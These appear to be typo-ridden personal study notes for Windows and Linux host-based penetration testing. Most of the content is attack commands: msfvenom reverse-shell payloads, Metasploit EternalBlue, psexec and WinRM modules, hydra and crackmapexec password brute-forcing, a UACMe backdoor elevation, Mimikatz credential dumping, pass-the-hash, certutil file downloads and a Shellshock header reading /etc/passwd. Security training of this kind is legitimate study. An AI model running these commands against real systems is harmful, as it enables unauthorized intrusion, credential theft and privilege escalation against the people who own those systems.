## Introduction To Host Based 
+ atttacks are targerted toward a specfic system
+ System Host based attak are use play after you have gained access to a traget network
+ Misconfiguration in OS and inherent vulnerabilites 
+ Much more specialized

## Windows Vulnerabilites 
+ Severe vulnerabilites raninging from Conflicker ato eternal blue
+ Windows OS developed in C programming so BoF
+ By Default is not configured to run securly
+ New Vulenrabilites are not immediatly patched by Microsoft
+ WIndows also vulenrable to cross platform vulnerabilites for example SQL injection
+ Physical attacks like theft
+ Information disclouse - allows attacker to access confidentail data
+ BoF - allow attacker to write data to buffer and ovverun and write data to allocated memory addresss
+ RCE - runs attacker to remolty exeucted code
+ Pirvilege escalte- elevate privilages
+ DoS - allows an attacker to consume a system or host resources


+ TCP 80/443 Microsft IIS Web Server
+ WEBDAV 80/443 TCP allows HTTP extension Update Delte move and COpy
+ SMB 445 Network file shares on LAN network 
+ RDP TCP 3389 GUI remote access protocls
+ WinRM TCP 5986/443 Windows Remote manamgment protocl that can used to remote access to Windows System

## WebDav
+ Web Server by microsoft
+ statict and web pages supports asp, aspx,config,php
+ ROBUST GUI
+ WebDav extension to HTP protocol port 80/443
+ Check wheter webdav has been configured to run on the ISS web Server
+ davtest used to scan or authenticate and exploit webdav server
+ cadaver to upload and downlaod files from webdav servers

```
nmap -sV 80 --script=http-enum ip
hydra -L /usr/share/wordlists/metasploit/common_user.txt -p /usr/share/wordlists/metasploit/common_password.txt DOMAIN_IP http-get /webdav/
davtest -url URL_CONNECTION
davtest -auth username:password -url
cadaver URL
path for web shells /usr/share/webshells/
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
run 

use windows/iis/iss_webdav_upload_asp
set HttpUsername bob
set HtttpPassword password
set RHOST RemoteIP
set RPORT remote port
set PATH path_name


```

## SMB 
+SMB file shares and uses port 445 and ran ontop of port 139, samba is the open source linux implementation of SMB
+ User authentication and share authentication 
```
msfconsole 
search smb_login

psexec.py username@IP cmd.exe

msfconsole
use exploit/windows/smb/psexec
show options
set RHOSTS
Set SMBuser
set SMBPass

```
## ETERNAL BLUE
+ RCE to SMB services and elevasted privliages
```
nmap -sV -p 445 --script=smb-vuln-ms17-010 IP
AutoBlue MS17-010
set up shell code
1
1
set up netcat
eternalblue_exploit7.py ip shellcode/shellcode.bin

search eternalblue 

```
## RDP
+ Remote Desktop Protocol 
```
msfconsole
search rdp_scanner
use
set rhost
set rport
exploit 
```
```
hydra -L username.txt -P password.txt rdp://IP -s PORTNUMBER
xfreerdp /u:username /p:password :/v:IP:PORT
```

## BLUE KEEP
+ RDP vulnerability
+ Microsoft Research
+ 
```
msfconsole
search BlueKeep
set target

```

## WinRM
+ Remote Managment Protocol faciliate Remote Access with Windows System Over HTTPS
+ WINRM uses 5985 and 5986

```
nmap -sV -p 5985 IP
crackmapexec winrm IP -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
crackmapexec winrm IP -u administrator -p password -x "whoami"
crackmapexec winrm IP -u administrator -p password -x "systeminfo"
evil-winrm.rb -u admin =p "password" -i IP

msfconsole
search winrm_script
use winrm_script_exec
set FORCE_VBS true
set USERNAME
set PASSWORD
exploit
```

## Windows Kernel Exploitation 
Windows runs on Windows NT 
+ identify kernel exploit 
+downalod and compiling the kernel exploit
windows exploit suggester
metreperter getsystem to privilege escelate

```
search suggester
background # put meterpreter session in the background
```

```
windows-exploit-suggester.py --update
windows-exploit-suggester.py --database file.txt --systeminfo file.txt
upload ~/filelocation # upload files in msfconsole to widnows 
```

## Bypassing UAC with UACMe
+ UAC is user access control UAC is used to ensure that changes to the operating sysem requrie approval from the admisntrator or a user account that is part of the local group
+ AutoElevate
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > backdoor.exe
use multihandler
upload backdoor.exe and akagi64.exe
.\Akagair64.exe 23 location of backdoor

ps
migarte ps_num #pick nt authorithy

```


## Access Token 
+ Windows access token are a core element of the authentication process on windows
+ LSASS Local Security Authrotiy Subsystem Services
+ Acess token are geenrated by winlgo.exe preocess everytime a user uatheticates
+ Token attacched to userinit.exe
+ Token are assigned level impersonate level non interactive login delegate level ran through interactive login on windows
+ 
```
getprivs #setting we want to see setimpersonateprivliage
load incagnito
list_tokens -u
impersonate_token "NAMEOFTOKEN"
migrate 3512
```

## Alternate Data Streams 
+ ADS ia an NTFS file attributes 
+ THis can be done by storing the malicouse code or exectuable in the file attribute resource stream
+ It is used to evade basic signaure based AV and statci scanning tools
```

notepad hello.txt:secret.txt

```

## WIndows Password Hashes
+ Store password in the SAM database
+ Converting a piece of data into another value.
+ WIndows uses LM and NTLM
+ NTLM from WIndows Vista and onwards
+ NTLM to facilitate authentication between computers
+ NTLM does not split two chunks
+ Case senstive and allows the use of symbols and unicdoe

## Password in Windows Configuration Files 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > payload.exe

certutil -urlcache -f URL filename

```

```
search -f unattend.xml msfconsole
cd C:\\Windows\Panther\unattend.xml

psexec.py username@ip

```

## Dumping Hashes with MimiKatz
+ post exploitation tool
+ extract clear text password hashes and kerberos tickets from memory
+ mimikats exxtract hashes from the lsass.exe
+ Kiwi meterpreter or Mimikatz

```
pgrep lsass
migrate num
getuid
load kiwi
```

```
./mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa:logonpasswords
 
```

## Pass the Hash
+ exploitation involves capturing or harvesting NTLM hashes or clear text passwrod to authenticate
+ tools cracmapexec and psexec

```
hashdump
copy hash
windows/smb/psexec
set LHOST
set RPORT
set SMBUsers
set SMBPass
set target # try command or Native\ upload
exploit
 
```

```
crackmapexec smb IP -u Username -H "NTLMHASH" -x "commands"


```

## SHELLSHOCK
```
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'


```


## SSH LOGIN
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.245.211.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploi
```



## SUID 
```
add /bin/bash to set UID
```


# Password Cracking
```
msfconsole
use post/linux/gather/hashdump
set SESSION 1
exploit

crack Password 
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

















